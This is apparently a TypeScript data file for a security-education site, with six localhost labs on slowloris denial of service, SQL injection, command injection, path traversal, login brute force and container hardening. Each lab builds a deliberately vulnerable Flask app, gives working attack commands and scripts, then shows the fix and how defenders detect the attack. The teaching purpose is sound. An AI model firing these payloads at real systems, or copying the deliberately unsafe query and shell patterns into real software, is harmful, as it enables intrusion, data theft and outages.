/**
 * The Workshop: labs where you build a small vulnerable service on your own
 * machine, attack it over localhost, watch it break, then fix it and watch the
 * fix hold. The attacker's chair, but on a real server you own, so the commands
 * are the real ones. This is the hands-on twin of the browser-simulated
 * /break-in section and the reference modules.
 *
 * Every lab is self-contained and bound to 127.0.0.1: nothing here touches a
 * network, a shared machine or anyone else's system. Each one ends in the
 * defence and in how a defender would spot the attack, because learning to fix
 * it is the whole point. The French mirror is src/data/fr/workshop.ts.
 */
import { WORKSHOP_FR } from "./fr/workshop";

export interface Step {
  /** One action, plain language; `backticks` become inline code. */
  text: string;
  /** A block to type or save, shown as a terminal/code block. */
  code?: string;
}

export interface WorkshopLab {
  id: string;
  title: string;
  /** One line for the card. */
  tagline: string;
  /** The class of flaw, for the badge: "Resilience", "Injection", "Access control". */
  tag: string;
  /** A rough time, in minutes. */
  minutes: number;
  /** What the learner needs installed. */
  needs: string[];
  /** Taught from scratch: what the flaw is and why it happens. */
  intro: string[];
  /** How to keep the whole lab on your own machine. */
  isolate: string;
  /** Build the deliberately weak service, on localhost. */
  build: Step[];
  /** Attack it, over localhost only. */
  attack: Step[];
  /** What to watch for while it breaks. */
  observe: string;
  /** The fix, then prove it holds. */
  defend: Step[];
  /** How a defender notices this in the wild. */
  detect: string;
  learn: { href: string; title: string }[];
}

/** The rule that sits on the hub and every lab, in both languages via ui.ts. */
export const WORKSHOP_LAW_KEY = "workshop.law";

export const WORKSHOP: WorkshopLab[] = [
  {
    id: "flood",
    title: "Flood your own server",
    tagline: "watch one slow client take a server down, then make it shrug the attack off",
    tag: "Resilience",
    minutes: 40,
    needs: ["Python 3", "curl"],
    intro: [
      "A denial-of-service attack doesn't steal anything: it makes a server too busy to answer anyone else. The simplest version isn't a flood of traffic at all. A server that handles one request at a time can be frozen by a single client that opens a request and then dribbles it out forever, so the server waits and waits and never gets to the next person. That's a slowloris, and it needs almost no bandwidth.",
      "You'll build a tiny web server that serves one request at a time, freeze it from a second terminal with a handful of slow connections, then put it behind a real server with timeouts and rate limits and watch the same attack bounce off. This is resilience testing of your own server, on your own machine. The point is the defence.",
    ],
    isolate: "Everything binds to 127.0.0.1, the loopback address your own machine answers on, so nothing leaves the computer. Work in a fresh folder and a Python virtual environment. Never point a load or flood tool at a server you don't own: doing that to someone else's system is a crime, and the lab's attack script only ever talks to 127.0.0.1.",
    build: [
      { text: "Make a folder and a virtual environment, and install Flask.", code: "mkdir flood-lab && cd flood-lab\npython3 -m venv venv\n. venv/bin/activate        # Windows: venv\\Scripts\\activate\npip install flask" },
      { text: "Save this as `app.py`. `threaded=False` makes it serve one request at a time, like many small services do by mistake.", code: "from flask import Flask\napp = Flask(__name__)\n\n@app.get(\"/\")\ndef home():\n    return \"ok\\n\"\n\nif __name__ == \"__main__\":\n    # Bound to localhost, one request at a time: deliberately fragile.\n    app.run(host=\"127.0.0.1\", port=5000, threaded=False)" },
      { text: "Run it, and in another terminal check it answers in a few milliseconds.", code: "python app.py\n# other terminal:\ncurl -m 3 http://127.0.0.1:5000/" },
    ],
    attack: [
      { text: "Save this as `slowloris.py`. It opens a few connections to your own server and starts a request it never finishes, sending one more header line every ten seconds so the server keeps the connection open and keeps waiting.", code: "import socket, time\n\nTARGET = (\"127.0.0.1\", 5000)   # your own machine only\nN = 20\n\nsocks = []\nfor _ in range(N):\n    s = socket.create_connection(TARGET)\n    s.sendall(b\"GET / HTTP/1.1\\r\\nHost: localhost\\r\\n\")  # no blank line: never finished\n    socks.append(s)\n\nprint(f\"holding {N} half-open requests; now try: curl -m 3 http://127.0.0.1:5000/\")\nwhile True:\n    for s in socks:\n        s.sendall(b\"X-Keep: alive\\r\\n\")\n    time.sleep(10)" },
      { text: "Run it, then try a normal request from a third terminal.", code: "python slowloris.py\n# third terminal:\ncurl -m 3 http://127.0.0.1:5000/" },
    ],
    observe: "The normal `curl` hangs and then times out: the server is alive but has no attention left. Twenty idle connections, almost no traffic, and nobody else can get in. Stop the attack (Ctrl+C) and the server answers again.",
    defend: [
      { text: "Serve it with a real server that runs several workers and cuts off a request that stalls. Install and run Gunicorn with a short timeout.", code: "pip install gunicorn\ngunicorn -w 4 --timeout 15 -b 127.0.0.1:5000 app:app" },
      { text: "That alone blunts it; several workers and a timeout mean a stalled request is dropped instead of holding a worker forever. Add a per-client rate limit so a flood of complete requests is capped too.", code: "pip install flask-limiter" },
      { text: "Wire the limiter into `app.py` and re-run under Gunicorn.", code: "from flask import Flask\nfrom flask_limiter import Limiter\nfrom flask_limiter.util import get_remote_address\n\napp = Flask(__name__)\nlimiter = Limiter(get_remote_address, app=app, default_limits=[\"60 per minute\"])\n\n@app.get(\"/\")\ndef home():\n    return \"ok\\n\"" },
      { text: "Run `slowloris.py` again, then a normal `curl`. It answers. The real world adds one more layer: a reverse proxy (nginx, Caddy) or a CDN in front, with its own header and connection timeouts, so slow clients are dropped before they ever reach your app.", code: "curl -m 3 http://127.0.0.1:5000/   # still 'ok'" },
    ],
    detect: "A defender sees many connections from one address that open but never complete, and workers sitting at full with almost no bandwidth used. Connection and request-rate metrics spike while throughput doesn't. Rate limiters, a WAF, fail2ban and a reverse proxy's timeouts catch the slow-client shape; at real scale, an anti-DDoS CDN absorbs volume before it reaches the origin.",
    learn: [
      { href: "/courses/0046-how-web-applications-fail/", title: "How web applications fail" },
      { href: "/modules/01-13-denial-of-service/", title: "Denial of service" },
    ],
  },
  {
    id: "sqli",
    title: "Break a login with SQL injection",
    tagline: "build a login that pastes your input into a query, then walk straight through it",
    tag: "Injection",
    minutes: 35,
    needs: ["Python 3", "curl"],
    intro: [
      "A web app turns your input into a database query. When it builds that query by gluing strings together, your input stops being data and becomes part of the command. A single quote ends the string the app opened, and whatever you write next, the database runs. This is the oldest and still one of the most damaging web flaws.",
      "You'll build a login backed by a real SQLite database, bypass it without a password, and read a table that was never meant to be shown, then rewrite one line so the input can only ever be data again.",
    ],
    isolate: "The app and its database are files in a folder on your machine, bound to 127.0.0.1. The data is made up. You are attacking your own code: that is exactly what secure development and authorised testing look like.",
    build: [
      { text: "New folder and environment, install Flask.", code: "mkdir sqli-lab && cd sqli-lab\npython3 -m venv venv && . venv/bin/activate\npip install flask" },
      { text: "Save `app.py`: a login that builds its query by hand. This is the bug.", code: "import sqlite3\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\ndef db():\n    c = sqlite3.connect(\":memory:\")\n    c.executescript(\"CREATE TABLE users(name TEXT, pw TEXT, secret TEXT);\"\n                    \"INSERT INTO users VALUES('admin','s3cret','the flag'),('amy','hunter2','hi');\")\n    return c\n\n@app.get(\"/login\")\ndef login():\n    u, p = request.args.get(\"u\", \"\"), request.args.get(\"p\", \"\")\n    # BUG: the query is built from raw input.\n    q = f\"SELECT secret FROM users WHERE name = '{u}' AND pw = '{p}'\"\n    row = db().execute(q).fetchone()\n    return (row[0] + \"\\n\") if row else \"no\\n\"\n\nif __name__ == \"__main__\":\n    app.run(host=\"127.0.0.1\", port=5000)" },
      { text: "Run it and log in honestly first.", code: "python app.py\ncurl \"http://127.0.0.1:5000/login?u=admin&p=s3cret\"   # the flag" },
    ],
    attack: [
      { text: "A wrong password should fail. Now end the password string yourself and comment out the rest of the query, so only the name has to match.", code: "curl \"http://127.0.0.1:5000/login?u=admin&p=wrong\"            # no\ncurl \"http://127.0.0.1:5000/login?u=admin'--%20&p=x\"          # the flag" },
      { text: "Or make the whole condition true without knowing any name at all.", code: "curl \"http://127.0.0.1:5000/login?u=x'%20OR%20'1'='1&p=x'%20OR%20'1'='1\"" },
    ],
    observe: "`admin'-- ` closes the name string and comments out the password check, so the database runs `WHERE name = 'admin'` and hands back the secret. The login never checked a password at all. The database did exactly what the text told it to; it had no way to know which part was yours.",
    defend: [
      { text: "Send the input as values the database never parses as code: a parameterised query. The `?` placeholders are the one real fix.", code: "q = \"SELECT secret FROM users WHERE name = ? AND pw = ?\"\nrow = db().execute(q, (u, p)).fetchone()" },
      { text: "Re-run both attacks: now they return `no`. The quote is just a character in a value. Try the honest login again to confirm it still works, then add defence in depth: a database account that can only read what it needs, so even a missed query reaches little.", code: "curl \"http://127.0.0.1:5000/login?u=admin'--%20&p=x\"   # no\ncurl \"http://127.0.0.1:5000/login?u=admin&p=s3cret\"    # the flag" },
    ],
    detect: "Logs show odd inputs: quotes, `--`, `OR '1'='1`, `UNION SELECT`. Database errors from malformed queries are a strong signal. A WAF flags classic payloads, parameterised queries make them inert, and query logging plus least-privilege accounts limit and reveal what a successful injection touched.",
    learn: [
      { href: "/courses/0037-databases-and-sql/", title: "Databases and SQL" },
      { href: "/modules/04-02-sql-injection-in-depth/", title: "SQL injection in depth" },
    ],
  },
  {
    id: "cmdi",
    title: "Turn a form field into a shell",
    tagline: "an app that runs a command with your text in it will run your command too",
    tag: "Injection",
    minutes: 30,
    needs: ["Python 3", "curl"],
    intro: [
      "Some apps shell out to a real program to do their work: ping a host, resize an image, look up a domain. When the app builds that command line by pasting your input into it and hands the whole string to a shell, the shell reads your input as more command. A semicolon ends the app's command and starts yours.",
      "You'll build a tiny \"ping\" tool with this flaw, run your own commands through it, then remove the shell from the equation so your input can only ever be an argument.",
    ],
    isolate: "The server runs on 127.0.0.1 and the commands run as your own user, in your own folder. You are injecting commands into your own machine to see the mechanism. Never aim this at a service you don't own.",
    build: [
      { text: "New folder and environment, install Flask.", code: "mkdir cmdi-lab && cd cmdi-lab\npython3 -m venv venv && . venv/bin/activate\npip install flask" },
      { text: "Save `app.py`: it pings a host you give it, the unsafe way, by handing a built string to the shell.", code: "import subprocess\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.get(\"/ping\")\ndef ping():\n    host = request.args.get(\"host\", \"\")\n    # BUG: shell=True runs the whole string in a shell.\n    out = subprocess.run(f\"ping -c 1 {host}\", shell=True, capture_output=True, text=True)\n    return out.stdout + out.stderr\n\nif __name__ == \"__main__\":\n    app.run(host=\"127.0.0.1\", port=5000)" },
      { text: "Run it and ping localhost normally.", code: "python app.py\ncurl \"http://127.0.0.1:5000/ping?host=127.0.0.1\"" },
    ],
    attack: [
      { text: "End the ping command with a semicolon and add your own. `%3B` is `;` and `%20` is a space in a URL.", code: "curl \"http://127.0.0.1:5000/ping?host=127.0.0.1%3B%20id\"\ncurl \"http://127.0.0.1:5000/ping?host=127.0.0.1%3B%20whoami\"" },
    ],
    observe: "The response has the ping output and then the output of `id`: your command ran on the server, as the server's user. From here an attacker reads files, opens a reverse shell, or pivots. The shell couldn't tell the hostname from the command because both arrived as one string.",
    defend: [
      { text: "Don't involve a shell. Pass the command as a list of arguments, so your input is only ever the single argument it's meant to be.", code: "import subprocess\n\n@app.get(\"/ping\")\ndef ping():\n    host = request.args.get(\"host\", \"\")\n    # No shell: host is one argument, never parsed as a command.\n    out = subprocess.run([\"ping\", \"-c\", \"1\", host], capture_output=True, text=True)\n    return out.stdout + out.stderr" },
      { text: "Re-run the injection: `; id` is now treated as part of the hostname, which simply fails to resolve. Add an input check too, so only things that look like a host get through.", code: "import re\nif not re.fullmatch(r\"[A-Za-z0-9.\\-]{1,253}\", host):\n    return \"invalid host\\n\", 400" },
    ],
    detect: "Shell metacharacters in input (`;`, `|`, `&`, `$()`, backticks) are the tell. Process and audit logs show a web service spawning unexpected children like `id`, `sh` or `curl`. Argument-list execution removes the class entirely; EDR and command-line logging catch attempts and successes.",
    learn: [
      { href: "/courses/0047-keeping-input-out-of-the-code/", title: "Keeping input out of the code" },
      { href: "/modules/04-03-injection-beyond-sql/", title: "Injection beyond SQL" },
    ],
  },
  {
    id: "traversal",
    title: "Read files you weren't given",
    tagline: "a download link that trusts a filename will hand over the whole disk",
    tag: "Access control",
    minutes: 25,
    needs: ["Python 3", "curl"],
    intro: [
      "Apps often serve files by name: a page, an avatar, a report. When the app builds the path by joining a folder to a filename you supply, `../` steps up out of the folder. Enough of them and you reach the root of the disk, then any file the service can read: config with passwords, keys, the system's user list.",
      "You'll build a file server with this flaw, read a file outside its folder, then anchor every path inside the folder so `../` goes nowhere.",
    ],
    isolate: "The server runs on 127.0.0.1 and can only read what your own user can. You read your own files to see the flaw. The fix is the same whoever owns the machine.",
    build: [
      { text: "New folder, a public sub-folder with one file, and an environment.", code: "mkdir traversal-lab && cd traversal-lab\nmkdir public && echo \"the home page\" > public/index.html\necho \"TOP SECRET\" > secret.txt        # outside public/, must stay unreachable\npython3 -m venv venv && . venv/bin/activate && pip install flask" },
      { text: "Save `app.py`: it serves files from `public/`, the unsafe way.", code: "import os\nfrom flask import Flask, request\n\napp = Flask(__name__)\nROOT = os.path.join(os.getcwd(), \"public\")\n\n@app.get(\"/file\")\ndef file():\n    name = request.args.get(\"name\", \"index.html\")\n    # BUG: the name is trusted and joined straight on.\n    with open(os.path.join(ROOT, name)) as f:\n        return f.read()\n\nif __name__ == \"__main__\":\n    app.run(host=\"127.0.0.1\", port=5000)" },
      { text: "Run it and read the page the normal way.", code: "python app.py\ncurl \"http://127.0.0.1:5000/file?name=index.html\"" },
    ],
    attack: [
      { text: "Step up out of `public/` with `../` to read the file beside it, and then a real system file.", code: "curl \"http://127.0.0.1:5000/file?name=../secret.txt\"\ncurl \"http://127.0.0.1:5000/file?name=../../../../etc/passwd\"   # your own /etc/passwd" },
    ],
    observe: "The server hands back `TOP SECRET`, and then your machine's `/etc/passwd`. The code asked for a file under `public/`, but `../` walked straight out: joining paths doesn't keep anyone inside a folder.",
    defend: [
      { text: "Resolve the final path and check it really sits inside the folder before opening it. `os.path.realpath` collapses the `../` so you compare the true location.", code: "import os\nfrom flask import abort\n\n@app.get(\"/file\")\ndef file():\n    name = request.args.get(\"name\", \"index.html\")\n    full = os.path.realpath(os.path.join(ROOT, name))\n    if os.path.commonpath([full, ROOT]) != ROOT:\n        abort(403)\n    with open(full) as f:\n        return f.read()" },
      { text: "Re-run the attacks: both are refused with 403, while the normal page still loads. Better still, don't take file paths from users at all: map an id to a known filename.", code: "curl \"http://127.0.0.1:5000/file?name=../../../../etc/passwd\"   # 403" },
    ],
    detect: "`../`, encoded forms like `%2e%2e%2f`, and absolute paths in requests are the signal, as are 403s clustered on a file endpoint. Reads of files far outside the web root show in file-access logs. Anchoring paths and mapping ids to names removes the class; a WAF flags the patterns.",
    learn: [
      { href: "/courses/0046-how-web-applications-fail/", title: "How web applications fail" },
      { href: "/modules/04-08-files-traversal-and-uploads/", title: "Files, traversal and uploads" },
    ],
  },
  {
    id: "auth",
    title: "Guess your way past a login",
    tagline: "weak session tokens and no rate limit turn a login into a door that opens itself",
    tag: "Access control",
    minutes: 35,
    needs: ["Python 3", "curl"],
    intro: [
      "A login has two jobs: check the password, and hand back a session token that proves who you are afterwards. Two mistakes undo both. If the server never slows down wrong guesses, a weak password falls to a short script. And if the token it hands out is predictable, an attacker can forge someone else's without guessing a password at all.",
      "You'll build a login with both flaws, brute-force it and forge a session, then add rate limiting and make the token unguessable.",
    ],
    isolate: "The server runs on 127.0.0.1 with a made-up account. You are brute-forcing your own login to feel why these two defences matter. Running this against anyone else's login is illegal.",
    build: [
      { text: "New folder and environment, install Flask.", code: "mkdir auth-lab && cd auth-lab\npython3 -m venv venv && . venv/bin/activate\npip install flask" },
      { text: "Save `app.py`: no limit on tries, and a session number that just counts up.", code: "from flask import Flask, request\n\napp = Flask(__name__)\nUSERS = {\"amy\": \"1234\"}      # a weak password\nnext_id = 100\nsessions = {}\n\n@app.get(\"/login\")\ndef login():\n    global next_id\n    u, p = request.args.get(\"u\", \"\"), request.args.get(\"p\", \"\")\n    if USERS.get(u) == p:\n        next_id += 1                 # BUG: predictable token\n        sessions[next_id] = u\n        return f\"session={next_id}\\n\"\n    return \"no\\n\"                    # BUG: no rate limit\n\n@app.get(\"/me\")\ndef me():\n    sid = int(request.args.get(\"session\", 0))\n    return (sessions.get(sid, \"nobody\")) + \"\\n\"\n\nif __name__ == \"__main__\":\n    app.run(host=\"127.0.0.1\", port=5000)" },
      { text: "Run it and log in honestly to see a token.", code: "python app.py\ncurl \"http://127.0.0.1:5000/login?u=amy&p=1234\"   # session=101" },
    ],
    attack: [
      { text: "Brute-force the four-digit password from a second terminal: nothing stops the guesses.", code: "for p in $(seq -w 0 9999); do\n  curl -s \"http://127.0.0.1:5000/login?u=amy&p=$p\" | grep -q session && echo \"found: $p\" && break\ndone" },
      { text: "Forge a session without any password: the tokens just count up, so a live one is near the current number.", code: "for s in $(seq 100 120); do\n  who=$(curl -s \"http://127.0.0.1:5000/me?session=$s\")\n  [ \"$who\" != \"nobody\" ] && echo \"session $s = $who\"\ndone" },
    ],
    observe: "The password falls in seconds, and even without it, guessing a dozen small numbers lands on a real session belonging to `amy`. Neither attack needed anything clever: the server didn't slow guessing, and the token carried no secrecy.",
    defend: [
      { text: "Hand out a token nobody can guess, from a cryptographic random source, and store a hash of it. Add a rate limit so wrong guesses stall.", code: "import secrets\nfrom flask_limiter import Limiter\nfrom flask_limiter.util import get_remote_address\n\nlimiter = Limiter(get_remote_address, app=app)\n\n@app.get(\"/login\")\n@limiter.limit(\"5 per minute\")        # wrong guesses now crawl\ndef login():\n    u, p = request.args.get(\"u\", \"\"), request.args.get(\"p\", \"\")\n    if USERS.get(u) == p:\n        token = secrets.token_urlsafe(32)   # 256 bits of randomness\n        sessions[token] = u\n        return f\"session={token}\\n\"\n    return \"no\\n\"" },
      { text: "Install the limiter, re-run both attacks: the brute force hits the limit and stalls, and the token is now unguessable. In a real app, also hash and salt stored passwords, set the cookie `HttpOnly` and `Secure`, and lock an account after repeated failures.", code: "pip install flask-limiter" },
    ],
    detect: "Many failed logins for one account or from one address, in a short time, is the classic brute-force signature; so is a burst of requests trying sequential session ids. Rate limiting, lockouts and long random tokens defeat it, and authentication logs plus alerts on failure spikes reveal it.",
    learn: [
      { href: "/courses/0036-sessions-and-the-browser/", title: "Sessions and the browser" },
      { href: "/modules/04-06-authentication-and-jwt-attacks/", title: "Authentication and JWT attacks" },
    ],
  },
  {
    id: "contain",
    title: "Contain the blast radius",
    tagline: "run a weak app in a container, break into it, then lock the container down so the same bug goes nowhere",
    tag: "Container security",
    minutes: 45,
    needs: ["Docker"],
    intro: [
      "A container is not a sandbox by default. Out of the box it runs as root, with a writable filesystem and full network access, so a single flaw in your app — a command injection, say — doesn't just run some code: it runs as root, can read and rewrite anything in the container, and can call out to the network. The container is a packaging tool, not a security boundary, until you make it one.",
      "You'll build a deliberately weak app inside a container, exploit it over localhost to run commands as root, then harden the container — an unprivileged user, a read-only filesystem, no Linux capabilities, no new privileges — and watch the very same injection do almost nothing. Only then do you fix the bug itself. The lesson is defence in depth: even after an attacker finds a bug, least privilege decides how far they get.",
    ],
    isolate: "Everything runs in a container on your own machine, published only to 127.0.0.1, on throwaway data. The app binds inside the container; Docker maps it to loopback, so nothing is reachable from the network. You only ever attack your own container at 127.0.0.1 — pointing these commands at anyone else's host is a crime.",
    build: [
      { text: "Make a folder and save this `Dockerfile`. It installs Flask and runs the app — as root, with no hardening, the way a container starts by default.", code: `FROM python:3.12-slim\nRUN pip install flask\nWORKDIR /app\nCOPY app.py .\nCMD ["python", "app.py"]` },
      { text: "Save this as `app.py`: a tiny \"network tools\" service with one deliberately unsafe endpoint. It builds a shell command by pasting your input straight in, the classic command-injection mistake.", code: `import subprocess\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.get("/ping")\ndef ping():\n    host = request.args.get("host", "127.0.0.1")\n    # Unsafe on purpose: the host is dropped straight into a shell string.\n    out = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True, text=True)\n    return out.stdout + out.stderr\n\nif __name__ == "__main__":\n    app.run(host="0.0.0.0", port=5000)` },
      { text: "Save this as `compose.yaml`. The port is published only to 127.0.0.1, so the service answers on your machine and nowhere else. Build and run it.", code: `services:\n  tools:\n    build: .\n    ports:\n      - "127.0.0.1:5000:5000"` },
      { text: "Start it, and from another terminal check a normal request works.", code: `docker compose up --build\n# other terminal:\ncurl "http://127.0.0.1:5000/ping?host=127.0.0.1"` },
    ],
    attack: [
      { text: "Inject a second command after the host. A semicolon ends the `ping` command and the shell runs whatever follows — here, `id`, which prints who the code is running as.", code: `curl "http://127.0.0.1:5000/ping?host=127.0.0.1;id"` },
      { text: "Read the answer: alongside the ping output you get something like `uid=0(root) gid=0(root)`. The injected command runs as root inside the container. Confirm the reach — it can read files and the filesystem is writable.", code: `curl "http://127.0.0.1:5000/ping?host=;cat%20/etc/os-release"\ncurl "http://127.0.0.1:5000/ping?host=;touch%20/app/owned%20&&%20echo%20wrote-a-file"` },
    ],
    observe: "One injection owns the whole container: it runs as root, reads any file, and writes anywhere. The app only meant to ping a host, but because the container gives the process root, a writable disk and full capabilities, the bug's blast radius is the entire container — and from there, often the host.",
    defend: [
      { text: "First, shrink what the process is allowed to do, without touching the bug. Replace `compose.yaml` with this: a non-root user, a read-only root filesystem, every Linux capability dropped, and no way to gain new privileges. A small `tmpfs` gives the few writable paths the runtime needs.", code: `services:\n  tools:\n    build: .\n    ports:\n      - "127.0.0.1:5000:5000"\n    user: "10001:10001"\n    read_only: true\n    cap_drop:\n      - ALL\n    security_opt:\n      - "no-new-privileges:true"\n    tmpfs:\n      - /tmp` },
      { text: "Rebuild, then run the very same injection. Now `id` shows an unprivileged user, not root, and a write fails because the filesystem is read-only. The bug is still there, but it can barely do anything.", code: `docker compose up --build --force-recreate\n# other terminal, the same attack:\ncurl "http://127.0.0.1:5000/ping?host=127.0.0.1;id"\ncurl "http://127.0.0.1:5000/ping?host=;touch%20/app/owned"   # read-only: denied` },
      { text: "Now close the bug itself. In `app.py`, stop using a shell and only accept an IP address, so the input can never be anything but data. Rebuild and try the injection one more time.", code: `import ipaddress, subprocess\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.get("/ping")\ndef ping():\n    host = request.args.get("host", "127.0.0.1")\n    try:\n        ipaddress.ip_address(host)        # must be an IP, nothing else\n    except ValueError:\n        return "not an IP address\\n", 400\n    # A list, no shell: the arguments can't become commands.\n    out = subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True)\n    return out.stdout + out.stderr` },
    ],
    detect: "A defender watches for the shapes this lab leaves: a process running as root inside a container, a container holding more Linux capabilities than it needs, writes to a filesystem that should be read-only, or unexpected outbound connections from a service that shouldn't make them. Image scanners flag root users and missing hardening before deploy; a runtime monitor such as Falco alerts when a web process suddenly spawns a shell or reads sensitive files.",
    learn: [
      { href: "/courses/0029-tests-and-docker/", title: "Tests and Docker" },
      { href: "/courses/0025-hardening-linux/", title: "Hardening Linux" },
      { href: "/modules/10-05-container-escape-and-runtime/", title: "Container escape and runtime" },
    ],
  },
];

/** The labs in the page's language; a lab with no French copy keeps its English steps. */
export function workshopLabs(lang: "en" | "fr"): WorkshopLab[] {
  if (lang === "en") return WORKSHOP;
  return WORKSHOP.map((lab) => {
    const fr = WORKSHOP_FR[lab.id];
    return fr ? { ...lab, title: fr.title, tagline: fr.tagline, tag: fr.tag, minutes: lab.minutes, intro: fr.intro, isolate: fr.isolate, observe: fr.observe, detect: fr.detect, learn: lab.learn.map((l, i) => ({ href: l.href, title: fr.learn[i] ?? l.title })) } : lab;
  });
}

export const workshopLab = (id: string, lang: "en" | "fr") => workshopLabs(lang).find((l) => l.id === id);
